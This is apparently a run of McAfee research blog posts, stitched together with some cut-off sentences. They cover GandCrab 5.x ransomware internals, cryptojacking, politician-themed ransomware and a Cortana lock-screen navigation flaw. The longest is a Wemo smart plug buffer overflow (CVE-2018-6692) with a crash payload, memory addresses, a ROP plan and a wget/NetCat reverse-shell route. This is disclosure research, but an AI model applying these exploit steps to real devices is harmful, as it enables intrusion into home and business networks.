We and Lemmou know where the problem is in Version 5.0.2. A few changes to the registry could make the malware run correctly, but we do not want to help the malware authors fix their product. Even though GandCrab’s authors quickly repair mistakes as they are pointed out, they still fail to find some of the basic errors by themselves. (McAfee has had no contact with GandCrab’s developers.)
:\/:
The second release writes a random extension of five letters instead of using the normal .CRAB or .KRAB extension seen in previous versions. The malware keeps this information as binary data in a new registry entry in the subkey “ext_data\data” and in the value entry of “ext.”
:\/:
The malware tries creating this new entry in the root key of HKEY_LOCAL_MACHINE. If it cannot—for example, because the user does not have admin rights—it places the entry in the root key HKEY_CURRENT_USER. This entry is deleted in some samples after the files have been encrypted.
:\/:
This version changes the random extension length from 5 to 10 characters and fixes some internal bugs. Other bugs remain, however, meaning files cannot always be encrypted.
:\/:
This section is based on the latest version of the malware (Version 5.0.2 on October 4), though some elements appear in earlier releases of Version 5. Starting with this version, the malware uses two exploits to try to elevate privileges in the system.
:\/:
The first exploit uses a dynamic call to the function IsWoW64Process to detect whether the operating system is running in 32 or 64 bits.
:\/:
Depending on the result, the malware has two embedded DLLs, encrypted with a simple operation XOR 0x18.
:\/:
The malware authors use a clever trick with fuzzing to avoid detection: The first two bytes of the DLL are trash, something that is later fixed, as we see in the preceding image.
:\/:
After decryption and loading the exploit, this DLL creates a mutex in the system and some pipes to communicate with the main malware. The malware creates a pipe that the DLL reads later and prepares strings as the mutex string for the DLL.
:\/:
This mutex is checked when the malware starts. The function returns a 1 or 0, depending on whether it can open the mutex. Later, this result is checked and if the mutex can be opened the malware will avoid checking the version and will not use the two new exploits to elevate privileges.
:\/:
As with GandCrab Version 4.x and later, the malware later checks the version. If it is Vista or later, it tries to get the “TokenIntegrityLevel” class and relaunch the binary to elevate its privilege with a call to “ShellExecuteExW” with the “runas” application. If the system is Windows XP, the code will avoid that and continue in its normal flow.
:\/:
This mutex is never created for the main malware; it is created for the DLL loaded using the exploit. To better understand this explanation, this IDA snippet may help:
:\/:
This version changes the desktop wallpaper, which is created at runtime and is filled with the extension generated to encrypt the files. (The ransom note text or HTML has the name: <extension_in_uppercase>_DECRYPT. <txt|html>) and the user name of the machine.)
:\/:
The username is checked with “SYSTEM.” If the user is “SYSTEM,” the malware puts the name “USER” in the wallpaper.
:\/:
Here is an example of strings used in the wallpaper name and to check the name of the user and the format string, whether it is another user, or the final string in the case of SYSTEM user with USER in uppercase.
:\/:
The malware detects the language of the system and decrypts the strings and writes the correct ransom note in the language of the system.
:\/:
Customers of McAfee gateway and endpoint products are protected against the latest GandCrab versions. Detection names include Ran-Gandcrabv4! and many others.
:\/:
 (McAfee has verified that these vaccines are effective.) The version for GandCrab 4.x through 5.0.2 can prevent the files from being encrypted.
:\/:
For Version 4.x, the deletion of shadow volumes cannot be avoided but at least the files themselves are kept safe.
:\/:
For Version 5.x, encrypting the files can be avoided but not the creation and changing of the wallpaper, which the malware will still corrupt. The malware cannot create random extensions to encrypt the files but will prepare the string. Running the vaccine a second time removes the wallpaper if it is in the %TEMP% folder.
:\/:
The vaccine has versions with and without persistence. The version with persistence creates a random filename in a special folder and writes a special random entry in the registry to run each time with the system. In this case, the machine will always be protected against this malware (at least in its current state of October 10, and perhaps in the future).

Application process discovery: to detect antimalware and security products as well as normal programs
:\/:
Cyberattacks have always been, well, cyber. Their immediate effects were on our data, our digital information, and our devices…until they weren’t. The interconnected nature of the world and the way it’s built in 2018 has brought us exciting and revolutionary innovations, but it has also been leveraged by hackers to extend the impact of a cyberattack beyond the digital sphere into the physical. Pacemakers can be hacked, shocks can be sent to patients remotely. Critical infrastructure can be 
:\/:
, rendering cities powerless. Large corporations we trust with our data are violating that trust by collecting our data unknowingly, and even tracking our locations without consent. Cybercrime is no longer just cyber, and it can compromise a lot more than just data.
:\/:
When you think of one’s well-being, physical health often comes to mind. Hospitals, health care, and medical tools and devices have evolved to become members of an interconnected ecosystem. Many health care systems connect to the internet to operate, the same holds true with numerous medical devices such as pacemakers. But that makes the latter part of the ”Internet of Things,” a growing collection of connected devices which are potentially vulnerable to cyberattack. In fact, there have already been reports of threats to these medical devices. 
:\/:
, the FBI recalled half a million pacemakers, as a crucial flaw was discovered that could expose users to an attack. Additionally, security researchers 
:\/:
 a chain of vulnerabilities in a particular pacemaker brand that an attacker could exploit to control implanted pacemakers remotely and cause physical harm to patients.
:\/:
Cybercriminals have also set their sights on larger targets when it comes to hacking health care devices and institutions. We’ve seen a handful of hospitals taken offline in 
:\/:
, all due to the use of outdated or vulnerable systems. Some of these attacks locked patient data and made proper care unachievable for hours on end.
:\/:
Hospitals are also not the only type of critical infrastructure that’s been on the victim’s end of a cyberattack. In fact, cybercriminals have recently begun hitting critical infrastructure hard and fast, with dramatic results emerging from their efforts. They’ve infamously put an entire city in the Ukraine 
:\/:
 in which cybercriminals leveraged a zero-day vulnerability within an industrial plant’s safety system for a cyberattack.
:\/:
There are also cyber issues that impact our physical safety that don’t even come in the form of an attack. Lately, news has been circulating about big-name companies tracking users’ locations or data, even when certain settings are off or when the user is unaware of the action. Specifically, 
:\/:
 that even if a user disables Location History, Google still tracks users in particular instances — whenever they open up the Maps app, scan the internet for certain things, or receive automatic weather notifications. Even smartwatches have been used recently to 
:\/:
Ramifications such as these have changed the nature of privacy, as well as digital and physical safety as we know it. But as the threat landscape is evolving, so is the industry determined to protect innocent users everywhere.
:\/:
We at McAfee are working together with our entire industry to stop these types of attacks. We’re sharing threat intelligence, resources, and research findings to ensure we put up a united front against these threats. By learning from these attacks, we’re better preparing for those to come.
:\/:
We believe that together is power. And though these attacks are advanced, we know that acting together to stop them will be even more powerful.
:\/:
To learn more about McAfee’s approach to protecting against advanced cyberattacks and more, be sure to check us out at 
:\/:
 Although voice assistants fall in a different category, the other three are closely linked and driven by the goal of fast, profitable attacks that result in a quick return on a cybercriminal’s investment.
:\/:
One of the most significant shifts we see is that cryptojacking is still on the rise, while traditional ransomware attacks—aka “shoot and pray they pay”—are decreasing. Ransomware attacks are becoming more targeted as actors conduct their research to pick likely victims, breach their networks, and launch the malware followed by a high-pressure demand to pay the ransom. Although the total number of ransomware samples has fallen for two quarters, one family continues to spawn new variants. The Scarab ransomware family, which entered the threat landscape in June 2017, developed a dozen new variants in Q2. These variants combined make up more than 50% of the total number of Scarab samples to date.
:\/:
What spiked the movement, starting in fall 2017, toward cryptojacking? The first reason is the value of cryptocurrency. If attacker can steal Bitcoins, for example, from a victim’s system, that’s enough. If direct theft is not possible, why not mine coins using a large number of hijacked systems. There’s no need to pay for hardware, electricity, or CPU cycles; it’s an easy way for criminals to earn money. We once thought that CPUs in routers and video-recording devices were useless for mining, but default or missing passwords wipe away this view. If an attacker can hijack enough systems, mining in high volume can be profitable. Not only individuals struggle with protecting against these attacks; companies suffer from them as well.
:\/:
Securing cloud environments can be a challenge. Building applications in the cloud with container technology is effective and fast, but we also need to create the right amount of security controls. We have seen breaches in which bad actors uploaded their own containers and added them to a company’s cloud environment—which started to mine cryptocurrency.
:\/:
New technologies and improvements to current ones are great, but we need to find the balance of securing them appropriately. Who would guess to use an embedded voice assistant to hack a computer? Who looks for potential attack vectors in new technologies and starts a dialog with the industry? One of those is the McAfee Advanced Threat Research team, which provides most of the analysis behind our threats reports. With a mix of the world’s best researchers in their key areas, they take on the challenge of making the (cyber) world safer. From testing vulnerabilities in new technologies to examining malware and the techniques of nation-state campaigns, we responsibly disclose our research to organizations and the industry. We take what we learn from analyzing attacks to evaluate, adapt, and innovate to improve our technology.
:\/:
In response to the explosive increase in cryptomining campaigns in Q4 2017, the Cyber Threat Alliance has formed a cryptomining subcommittee to assess the threat. This committee comprises expert researchers from major cybersecurity companies, including McAfee. The committee has now released 
:\/:
 an in-depth report on the current state of unlawful cryptomining. In the report we explain what led to the recent rise in cryptomining-based attacks, their impact, defense recommendations, and predictions for future evolution of the attack. As members of the Cyber Threat Alliance and the cybersecurity community, we hope that individuals and enterprises can use our research to protect themselves from this threat and improve global security.
:\/:
To understand the cryptomining threat we need to go back only to late 2017 and early 2018 to see the dramatic growth of cryptomining incidents. Since 2017, the combined data of several CTA members shows a 459% increase in detections of mining malware.
:\/:
The increase of mining malware positively correlates with the growth of the value of coins. Specifically, in late 2017 we saw 
:\/:
 to US$20,000 per coin. Anything with a high value attracts cybercriminals, and cryptocurrencies experienced some of the most dramatic volatility ever of any currency. Cybercriminals were early adopters of cryptocurrencies and use them to fuel underground economies. They have increasingly turned to mining to increase their funds by stealing the computer power of their victims. This theft is also referred to as cryptojacking.
:\/:
Cryptocurrencies have become an increasingly popular alternative to traditional electronic money (e-money). E-money is based on a fiat currency such as the U.S. dollar. One of the most common examples is prepaid credit cards, which stand for the backing currency without the need for physical cash. Cryptocurrencies are generally not backed by a fiat currency. In fact, they are considered decentralized—meaning there is no central authority.
:\/:
Monero has several advantages over Bitcoin in terms of privacy and anonymity; this makes it a favorite among bad actors. Beyond anonymity concerns, resources required to mine Monero are significantly lower, enabling more users to participate and increasing the profitability of botnets.
:\/:
The act of generating the coin is called mining, which is using system resources to solve a complex mathematical problem. Most major coins employ a “proof of work” that uses CPU resources to solve. Large groups of miners, including botnets, can amass their resources, called pool mining, on a single problem. The mining operations result in a solved mathematical equation that returns newly minted coins to the system and validates new transactions.
:\/:
Current incidents of illicit cryptomining occur through compiled executables. This practice is called binary-based mining. In the context of the browser, the practice is called browser-based mining. Binary-based cryptomining malware is delivered as a payload, often using spam or exploit kits. Open-source tools often facilitate mining. XMRig is a legitimate tool for mining Monero, yet is also frequently used by malicious actors for illicit cryptomining.
:\/:
The most common browser-based miner is Coinhive. Used legitimately, it offers an alternative to ad revenue by monetizing system resources. However, it has been widely used without informing users. On occasion the owner of the service is unaware of the mining code; this was the case with a recent attack against both Facebook Messenger and Starbucks Wi-Fi. As of July 2, PublicWWW yielded at least 23,000 websites hosting Coinhive code.
:\/:
Beyond using browsers to gather system resources, malware authors have become increasingly sophisticated in other ways. They have taken advantage of widespread vulnerabilities such as EternalBlue to propagate, or have implemented other techniques for evasion. The 
:\/:
 was a very profitable campaign leveraging this approach. It used “living off the land” techniques to evade detection and increase its ability to mine Monero.
:\/:
Cryptomining may have an impact on both the short- and long-term security of an organization or user. Three primary impact areas include:
:\/:
If a device is used in an unauthorized way, there is evidence of a potential security flaw that needs to be addressed. In late 2017, misconfigured devices using FTP led to hundreds of thousands of Monero miners on consumer-grade devices. Bad actors can and have used these same flaws for additional attacks against the systems.
:\/:
Physical damage is also a concern. The CPU-intensive operation of mining will produce excess heat and power consumption. For small devices the immediate concern is battery life. However, for large systems, especially data centers, the activity can increase the failure rate of components; this can have a major effect on the system. Ultimately this may lead to costly repairs or increased hardware requirements to support the expanded load.
:\/:
Organizations may also see a hit to business operations. Mass-computing projects present a similar concern, albeit for more altruistic purposes. 
:\/:
, a medical research project aimed at understanding proteins, can be installed to use computer resources to help the research. However, business operations may be impacted by a loss of productivity or additional costs. Many businesses prohibit installing these types of computing projects to protect against unexpected costs and disruptions.
:\/:
Fortunately, the defense against cryptomining is very similar to that against other threats. Cryptomining malware uses the same tools and methods; thus maintaining good security practices goes a long way. These include analysis of non-typical network traffic, and properly configuring and patching systems. A few additional steps specific to cryptomining:
:\/:
For a more comprehensive list, including recommended Snort rules, see the Recommended Best Practices section of the report.
:\/:
Illicit cryptocurrency mining appears to have a positive correlation with Bitcoin value. As long as cryptocurrencies such as Bitcoin have value, we expect bad actors will continue to mine for profits. Although public cryptocurrencies like Bitcoin may be closely tied to monetary value, private or custom blockchains are also at risk and also need to prepare against future attacks.
:\/:
Private blockchains, including non-currency-related ones, may carry unique risks. Large blockchains such as Bitcoin are considered immutable due to the difficulty of changing historical ledger data. Private blockchains inherently lack the same scale of adoption and thus may be more susceptible to attacks. The 51% attack is a well-known threat that can take advantage of a smaller network and have a severe impact on the blockchain’s integrity.
:\/:
With some nation-states already turning to cryptocurrencies to solve economic issues, it is likely that some nation-states will use illicit mining to gain revenue. State-sponsored actors have already been implicated in the theft of cryptocurrencies, as 
:\/:
. Legitimately mined cryptocurrency has been implicated in obfuscating state-sponsored cyber operations, hiding purchases of VPN accounts, servers, and domain registrations.
:\/:
“The Illicit Cryptocurrency Mining Threat” represents the first joint industry initiative to educate enterprises and consumers about the growing threat of cryptocurrency mining. By improving security postures and adhering to proper security practices, we can increase the difficulty of these attacks succeeding, thus disrupting malicious behavior. Illicit cryptocurrency mining is not a fad. This problem will likely grow in relation to the value of cryptocurrencies. Current infection methods will give way to new techniques and exploits. The attraction of stealing cryptocurrencies may lead actors to develop targeted attacks against private implementations of blockchain as they become more prevalent. For more on illicit cryptomining threats, read the

. No, it’s not a lost single from the Oasis back catalogue, but in fact a relatively recent tactic by ransomware developers looking to exploit the profiles of major politicians to install ransomware on victims’ computers. Donald Trump, Angela Merkel, and now Barack Obama all serve as lures for the unsuspecting. Despite its claims, does the “Obama campaign” deliver the ransomware it advertises? Well, perhaps not.
:\/:
 Bleeping Computer, the Obama campaign displayed some confusing characteristics. For example, it encrypted only .exe files and asked for a tip to decrypt the files. This campaign does not behave like normal ransomware variants, which typically target user data files rather than .exe files.
:\/:
This unorthodoxy got us thinking: Was there a nation-state behind this campaign? At present, there is not enough evidence to confirm its source, although the language resources are in simplified Chinese. We discovered the following graph inside the ransomware:
:\/:
As the MalwareHunterTeam documented, the ransomware attempts to kill processes associated with certain antimalware products:
:\/:
Note, however, that the access protection enabled within McAfee software prevented the termination of this process:
:\/:
These curiosities made us wonder about the purpose of the ransomware. Was this indeed ransomware and, if so, why encrypt only .exe files? Our initial suspicions were immediately confirmed when we found a cryptocurrency coin mining component within the malware. In fact, the miner sample was almost identical to the ransomware component, with almost 80% code reuse. These similarities are highlighted below.
:\/:
 Is it possible that the two politicians are aligned with the same cybercriminal group looking to exploit their profiles?
:\/:
As previously reported, this variant was only a development version—encrypting files with AES and using the following .encrypted extension:
:\/:
The use of Angela Merkel and her profile is new to the discussion. “Her” campaign encrypts files using the .angelamerkel extension. The original name of this ransomware was ChromeUpadter.exe; it also uses AES to encrypt files. It employs the Euro in its ransom demands. Perhaps a European figure evokes the Euro?
:\/:
Malware developers are fond of exploiting famous names to lure unsuspecting victims. Although it would be simple to claim an increase in politically motivated ransomware, or rather ransomware that leverages the profiles of political figures, there is no significant evidence to suggest they are from the same threat actor. Equally, these campaigns might not even be ransomware, certainly in the case of the Obama campaign.
:\/:
Does this examination suggest three separate campaigns? There are some links and, no, they are not between Obama and Trump. The Trump and Merkel ransomware are 46% identical in code. We are left wondering whose campaign is the most successful. We shall see.

McAfee’s Advanced Threat Research team has operated from several locations around the world for many years. Today we are pleased to announce the grand opening of our dedicated research lab in the Hillsboro, Oregon, office near Portland. Although we have smaller labs in other locations, the new McAfee Advanced Threat Research Lab was created to serve two purposes. First, it gives our talented researchers an appropriate work space with access to high-end hardware and electronics for discovery, analysis, automation, and exploitation of vulnerabilities in software, firmware, and hardware. Second, the lab will serve as a demo facility, where the Advanced Threat Research team can showcase current research and live demos to customers or potential customers, law enforcement partners, academia, and even vendors.
:\/:
The lab has been a labor of love for the past year, with many of the team members directly contributing to the final product. Visitors will have the unique opportunity to experience live and recorded demos in key industry research areas, including medical devices, autonomous and connected vehicles, software-defined radio, home and business IoT, blockchain attacks, and even lock picking! Our goal is to make vulnerability research a tangible and relatable concept, and to shed light on the many security issues that plague nearly every industry in the world.
:\/:
Much of the research highlighted in the lab has been disclosed by McAfee. Links to recent disclosures from the Advanced Threat Research team:
:\/:
Onsite visitors will have the opportunity to solve a unique, multipart cryptographic challenge, painted on our custom mural wall in the lab. Those who are successful will receive an Advanced Threat Research team challenge coin! We will soon have an official video from the lab’s opening event online.
:\/:
The Internet of Things promises to make our lives easier. Want to remotely turn lights and appliances on and off and monitor them online? A “smart plug,” a Wi-Fi–connected electric outlet, is one simple method. But IoT devices can turn into attack vectors if they are not properly secured.

The McAfee Labs Advanced Threat Research team is committed to uncovering security issues in both software and hardware to help their developers provide safer products for businesses and consumers. We recently investigated a consumer product produced by Belkin. Our research into the Wemo Insight Smart Plug led to the discovery of an unreported buffer overflow in the libUPnPHndlr.so library. This flaw, 
:\/:
Can this vulnerability lead to a useful attack? A smart plug by itself has a low impact. An attacker could turn off the switch or at worst possibly overload the switch. But if the plug is networked with other devices, the potential threat grows. The plug could now be an entry point to a larger attack. Later in this report, we will look at one possible attack.
:\/:
Following the manual’s advice, the team used the Wemo phone application to set up the smart plug. We were able to remotely turn the outlet on and off. We then tested the software, including port scanning, monitoring normal network traffic, and reading online research. The Wemo listens on Universal Plug and Play (UPnP) ports TCP 49152 and 49153. The manuals, disassembly images, and the general-purpose programming language (GPL) were all online; they provided information on CPU architecture, the operating system, and applications.
:\/:
We turned to the hardware and disassembled the device. We identified chips on the main board, found headers for communicating with the device, and pulled the memory off flash. Our online research provided datasheets for each of the chips on the board.
:\/:
We found universal asynchronous receiver-transmitter (UART) pads on the board and confirmed them with the documentation. We soldered wires to these headers to discover if they were actively transmitting. To test communication with the device, we used an Exodus XI Breakout board, shown below:
:\/:
After brute-forcing the baud rate, we were able to get debug information via the UART interface. The UART also provided a login prompt; however, neither online research nor simple guessing led us to a working password.
:\/:
The flash chip discovered on the board was a Maxronix MX25L12835F, which is supported by flashrom, a well-known open-source tool for extracting firmware. Using flashrom and the XI Breakout board, we extracted the firmware from the Wemo device. After we obtained the original firmware image shipped with the device, we updated it using the Wemo mobile application. Once the device was updated, we again extracted the firmware from the device, providing us with a second image. We ran basic sanity checks with the new firmware to ensure our earlier software reconnaissance had not changed.
:\/:
With the firmware extracted, we analyzed the firmware using binwalk, an open-source binary analysis tool. Binwalk extracted the file system from the firmware for further inspection. Access to the file system allowed us to review system configuration and access binaries.
:\/:
Network or remote vulnerabilities are more dangerous than local flaws, so we took a close look at the UPnP ports listening on the local network. During this testing phase our lead analyst was taking a class on Exodus Intelligence Embedded Exploitation. One of the class instructors, Elvis Collado (@b1ack0wl) was developing a UPnP fuzzer and offered to assist our efforts. Using this tool we started fuzzing the open UPnP ports, while monitoring the UART interface on the Wemo. After a short time we saw a crash on the UART interface.
:\/:
After repeating and closely observing the experiment several times, we determined that the crash was caused by the following packet:
:\/:
<?xml version=”1.0″ ?><s:Envelope s:encodingStyle=”http://schemas.xmlsoap.org/soap/encoding/” xmlns:s=”http://schemas.xmlsoap.org/soap/envelope/”><s:Body><b1ack0wl_ns:UpdateInsightHomeSettingsxmlns:b1ack0wl_ns=”urn:Belkin:service:basicevent:1″><EnergyPerUnitCost>210</EnergyPerUnitCost><Currency>236</Currency><EnergyPerUnitCostVersion>KWWZWIVYBQZKDGSSAAPBCQVQQFAVYZEOEUFIDXXQPDYGESTOD
:\/:
For space reasons some of the payload has been removed. (The original data in “EnergyPerUnitCostVersion” was 2,828 characters.) After examining the crash data and the packet, this appears to be a standard buffer overflow, in which data is being overwritten onto the stack. We continued fuzzing, now focused on the “EnergyPerUnitCost” field and found we needed only 32 characters to crash the application.
:\/:
Although the crash dump provides us with a lot of good information, there is still a lot we do not know. For example, the crash occurs in the “WemoApp” and provides us an offset, but what is the base address of this library? What has been overwritten on the stack? Without access to the application during runtime these questions are difficult to answer. Because we obtained the file system earlier, we could statically analyze the WemoApp binary; but we would still be unable to determine the exact point of the crash easily.
:\/:
To answer these questions we needed to take one of two paths. We could virtualize the Wemo firmware or binary to continue testing; or if we could determine the root password on the UART interface, there is a chance we could debug on the device itself. Generally, virtualizing firmware is not simple and can sometimes lead to inaccurate test results. It is better to debug on the device. With all the information we found during reconnaissance, it seemed promising that we could bypass the root password. (We did spend some time attempting to virtualize the WemoApp—with no success.)
:\/:
From the extracted file system, we learned the Wemo runs the embedded Linux system OpenWRT, with the user account information held in either the standard /etc/passwd or /etc/shadow files. We extracted the hash for the root password from /etc/passwd and submitted it to a cracking rig. This method proved ineffective in a reasonable amount of time.
:\/:
With our ability to read the flash chip we had a good chance to write to the chip. Barring any checksum or validations done on the firmware, we might be able to replace the /etc/passwd file with a known password.
:\/:
To test this theory, we would have to repack the firmware. Since the GPL for the Wemo is public, we chose to use the same tools used by the developers. Using the GPL, we compiled the same version of squash tools 3.0 with Izma and repackaged the firmware file system with a modified /etc/passwd file. We added padding to ensure the firmware section was the same size as the original. We then used “dd” to insert the new file system segment into the firmware binary. During this process, we discovered that using binwalk to extract the firmware prevented us from correctly repackaging the firmware. We used “dd” with the information provided by binwalk to extract the correct section of the firmware binary for repackaging.
:\/:
With a new firmware binary in hand, we used the XI Breakout board and flashrom to write the firmware to the flash chip on the board. After rebooting the device, we were able to log in using the new password.
:\/:
With root access on the Wemo, we could gather more information about the crash during the UPnP fuzzing. First, we needed to compile the tools required to perform more in-depth analysis for this specific architecture. Using the GPL, we compiled gdbserver and gdb for the device. The Wemo had a large amount of installed tools, such as “wget,” making it simple to add files. We downloaded and executed the tools from the /tmp directory.
:\/:
After a large amount of trying, we failed to get gdb running directly or remotely with the device. So we used gdbserver, in conjunction with Interactive Disassembler Pro, for all debugging. With the debugger connected, we sent the packet causing the crash and saw the exact location of the crash. A segmentation fault occurred at address 0x2AC15B98. From the memory layout from the Linux “proc” directory, we determined his memory address resides in library libUPnPHndlr.so.
:\/:
Because the crash was caused by a UPnP packet, it was logical to find the crash inside this library . With the base address 0x2abf3000, we calculated the offset for static analysis in IDA to be 0x22b98.  At this address, we found the following:
:\/:
LOAD:00022B70 TokenParser:                             # CODE XREF: ProcessEnergyPerunitCostNotify+84↓p
:\/:
Because the developers left the binary unstripped, we can name this function TokenParser. The segmentation fault occurs at a branch instruction; however, in MIPS the delay instruction is executed before the branch occurs. Thus the instruction at 0x22B9C is causing the crash. Here the application attempts to load what is at the address stored in $v1 and place it in $v0. Taking a look at the registers, we find the data from our packet in XML tags “EnergyPerUnitCostVersion” is in $v1, leading to an “invalid write access” segmentation fault error.
:\/:
After statically analyzing the function, it appears to copy data from one section to another, looking three times for a 0x7C or “|” character. If it never finds the “|,” it keeps copying into a statically defined buffer. To fully understand why the overwrite occurs, let’s take a look at the stack as we step through the function:
:\/:
As the function copies data onto the stack, it eventually copies over the address for the original buffer. Once this address is overwritten, the function attempts to write the next byte at the new value, in this case is an invalid address. This overflow gives an attacker two exploitable vectors: a write-what-where condition allows an attacker to write data to an arbitrary location in memory; by continuing to overwrite data on the stack, an attacker can overwrite the $RA register or return address for the calling function, providing the attacker control of the execution flow.
:\/:
Now that that we understand the vulnerability, can we exploit it? Because this is a standard buffer overflow, we need to answer two questions. How much room is available on the stack, and are there any “bad” bytes that cannot make it onto the stack? To determine the available room, we can examine how much of the payload makes it onto the stack if we repair the address overwritten on the stack with a valid address. We learned only 91 bytes can be written onto the stack.
:\/:
The next step is to determine if there are any “bad” bytes. After running a few tests, we noticed that only ASCII characters can make it onto the stack. Before the vulnerable code is executed, the packet is parsed by the open-source XML parser “mxml.” This library follows the standard of allowing only ASCII and Unicode characters to exist between tags.
:\/:
This standard is very problematic for both shellcode and return-oriented programming (ROP) techniques because both memory address and shellcode tend to use mostly nonreadable characters. We could use several techniques to combat room on the stack; however, due to the hard limitation on characters that will pass through the XML sanitization process, it would be best to use functions that are already loaded into memory. One method that does not require extensive shellcode is to use a “return to libc” attack to execute the system command. Because the system call typically takes a string as a parameter, this might pass through the filter. Because the Wemo does not use address space layout randomization, if we use ROP it would be theoretically possible to make a call to system without needing to pass additional shellcode through the XML filter.
:\/:
We still face a major challenge: Only addresses comprising entirely ASCII characters can pass through the XML filter. This drastically limits the potential for finding usable gadgets. We used IDA to see where libc and system are loaded into memory, and found two implementations: in libuClibc-0.9.33.2.so at address 0x2B0C0FD4; and in libpthread-0.9.33.2.so at address 0x2AD104F4. However, neither of these addresses meet the requirements to pass through the XML filter. Thus even if we could create an ROP chain, we would not be able to send just the address for system in the packet.
:\/:
Addresses with bad characters are not a new problem for exploit development. One of the most common bypasses is to use addition or subtraction ROP gadgets to create the required address in a register and call that register. Again, however, we face the limitation on which operands can be used for this addition or subtraction equation due to the XML filter.
:\/:
After studying the memory layout, we discovered that libuClibc-0.9.33.2.so sits at a memory location with addresses that can bypass the XML filter. We were fortunate that this is a large library, providing a decent list of addresses, because it is the only library in such a space. With this discovery, the team created a tool to assist with the creation of this exploit. The tool pulls out all possible ROP gadgets with usable memory addresses and determines if an addition or subtraction equation could call one of the two system calls found in memory, using only the values that will bypass the filter. The address for system in libuClibc-0.9.33.2.so, 0x2B0C0FD4, did not have any usable operands. However, 0x2AD104F4 did. We found several “filter-proof” operands that when added together equaled 0x2AD104F4.
:\/:
We employed our tool’s output for all possible ROP gadgets that bypass the filter to build an ROP chain, which uses an addition instruction to create the final address for system and stores it in $s0. After the addition, another gadget moves the address for system into $t9 and calls system. This final gadget also moves an address that can be controlled from the stack into the register holding the parameter for the system call. The entire ROP chain consists of only three gadgets, which easily fit in the stack space provided by the buffer overflow.
:\/:
Earlier we discovered two attack techniques that can be used with this vulnerability: a write-what-where, and overwriting the return address on the stack. Each packet sent can use each technique once. To get a parameter to the system call, we must use write-what-where to place the parameter in a writable memory address and pass this address to system. Fortunately, this vulnerable application sets aside a large amount of writable memory that is never used, and in a range accessible to our limited set of addresses that bypass the filter. Unfortunately, the ROP chain that calls system requires the use of write-what-where to handle extra instructions in one of the ROP gadgets. This means that two packets are required to execute the exploit: one to write the parameter for system into memory, and a second to make the call to system. Thus it is important that the first packet exits cleanly and does not crash the program.
:\/:
One way to execute cleanly is to use three well-placed pipes (“|”) inside the payload to stop writing and exit TokenParser at the appropriate time. It is also important to not overwrite the RA pointer so the program can continue normal execution after the packet is received. Then the second packet is sent containing the ROP chain calling system with the address of the parameter written by the previous packet.
:\/:
With the discovery of a valid ROP chain that can call system, we must decide what system should call. Because system executes as root, we can gain complete control of the device. Our research has showed that the device has many Linux commands installed. We leveraged this earlier with wget to copy gdbserver to the device. An attacker could also call wget from system to download and execute any script. We explored further for installed applications and found NetCat, which could allow an attacker to write a script to create a reverse shell. An attacker could download a script using wget, and execute the script containing a NetCat command to create a reverse shell. We tested and proved this is one simple, effective method, opening a reverse shell as root. Attackers could choose many other methods to leverage this exploit and execute code. The following video demonstrates this exploit working with a reverse shell.
:\/:
To illustrate, the team wrote an attack scenario. After the plug is compromised, it could use the built-in UPnP library to poke a hole in the network router. This hole creates a backdoor channel for an attacker to connect remotely, unnoticed on the network. In the following video, we used a remote shell to control a TCL smart TV connected to the network. The Roku API implementation on the TV uses simple unencrypted HTTP GET/POST requests to issue commands and does not authenticate the machine sending these commands, making remote control trivial. Using the Wemo as a middleman, the attacker can power the TV on and off, install or uninstall applications, and access arbitrary online content. Smart TVs are just one example of using the Wemo to attack another device. With the attacker having established a foothold on the network and able to open arbitrary ports, any machine connected to the network is at risk. Because attacks can be conducted through the Wemo and the port mappings generated using this exploit are not visible from the router’s administration page, the attacker’s footprint remains small and hard to detect.
:\/:
Discoveries such as CVE-2018-6692 underline the importance of secure coding practices on all devices. IoT devices are frequently overlooked from a security perspective; this may be because many are used for seemingly innocuous purposes such as simple home automation. However, these devices run operating systems and require just as much protection as desktop computers. A vulnerability such as we discovered could become the foothold an attacker needs to enter and compromise an entire business network.

A locked Windows 10 device with Cortana enabled on the lock screen allows an attacker with physical access to the device to do two kinds of unauthorized browsing. In the first case, the attacker can force Microsoft Edge to navigate to an attacker-controlled URL; in the second, the attacker can use a limited version of Internet Explorer 11 using the saved credentials of the victim.
:\/:
 mechanism for all Windows 10 devices for which Cortana is enabled on the lock screen. (This is still the default option.) The discovery of the full login bypass was part of a wider research effort into what access the digital assistant Cortana might offer to an adversary when the device is locked. This post details these two additional issues; we reported them to Microsoft at the same time we reported the login bypass. The two new flaws have now been addressed as part of Microsoft’s August update. Some of the issues are also partially mitigated by modifying the answer obtained from a Bing search query.
:\/:
In the first scenario, a Cortana privilege escalation leads to forced navigation on a lock screen. The vulnerability does not allow an attacker to unlock the device, but it does allow someone with physical access to force Edge to navigate to a page of the attacker’s choosing while the device is still locked. This is not a case of BadUSB, man in the middle, or rogue Wi-Fi, just simple voice commands and interacting with the device’s touchscreen or mouse.
:\/:
 masquerading as a network interface card to inject content into trusted HTTP sites while using Cortana to force navigation. Microsoft has since removed this ability to navigate directly to a domain and instead now opens a search in Bing over HTTPS to the domain in question. Some of our findings could also be combined with a BadUSB approach.
:\/:
We explored whether one could still force navigation to an attacker-controlled page. In short, yes, one can, but it does take some extra effort.
:\/:
Cortana is very helpful when it comes to defining terms, or looking up corporations, movies, artists, or athletes. She can even do math. However, Cortana’s behavior and the answers she gives are affected by the way you ask a question. For example, if you were to ask the colloquial question “
:\/:
” you would receive a more detailed response, including links to various trusted sites. These include Wikipedia, Twitter, Facebook, LinkedIn, and the “official website” (more later on this important link).
:\/:
It is surprising that links are offered and clickable when the device is locked. If you start your favorite network sniffer or man-in-the-middle proxy, you will see that the links are visited as soon as the user clicks on them, irrespective of the device’s locked status.
:\/:
This means we can force navigation to a website (though not yet the one we want) when the device is locked. However, we have seen that Cortana can be picky in how she offers results. Bing must already know these results, and most links are known trusted sites.
:\/:
That leaves us with the official website. You might recognize this terminology: It is a common link presented by Wikipedia. If you look at the bottom of a Wikipedia article, you will often find a link to an official website.
:\/:
Could Cortana just use Wikipedia as a trusted source? After a few delightful conversations with her, we can confirm that the official website for items she refers from Wikipedia is indeed the same as the Official Website link on Wikipedia. There is no one-to-one correlation on Wikipedia’s official website for Cortana to display the corresponding link. We assume there is some possible weighting of the domain name or logic in the Bing output that influences Cortana’s displayed links.
:\/:
We can leverage this information to craft a fake Wikipedia entry, add enough content to get the review to succeed, add an official website link, and see what Cortana presents. Wikipedia reviewers do a pretty good job of vetting content, but we also need Bing to become aware of the entry so that Cortana could offer the answer and the link. Because of the time-dependent factor of the approach (and the ethical aspect of tampering with Wikipedia content in a malicious way), we decided to take a different path—although others could use this attack vector.
:\/:
